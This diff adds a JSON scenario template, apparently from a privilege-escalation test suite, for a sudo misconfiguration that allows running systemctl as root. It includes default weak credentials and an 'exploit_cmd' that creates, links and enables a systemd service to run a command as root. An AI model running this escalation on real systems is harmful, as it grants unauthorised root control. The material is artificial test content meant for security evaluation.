@@ -1,0 +1,31 @@
+{
+  "template_id": "auto_T1548_003_sudo_systemctl",
+  "category": "A2_sudo",
+  "attack_technique": "T1548.003",
+  "cwe": "CWE-269",
+  "description": "sudo misconfiguration allows running /usr/bin/systemctl as root, enabling shell",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "dedup_group": "sudo_service_creation",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "T1548_003_sudo_systemctl",
+      "type": "core",
+      "difficulty": "easy"
+    }
+  ],
+  "exploit_cmd": "echo '[Service]\nType=oneshot\nExecStart=/path/to/command\n[Install]\nWantedBy=multi-user.target' >/path/to/temp-file.service\nsystemctl link /path/to/temp-file.service\nsystemctl enable --now /path/to/temp-file.service",
+  "binary_path": "/usr/bin/systemctl"
+}
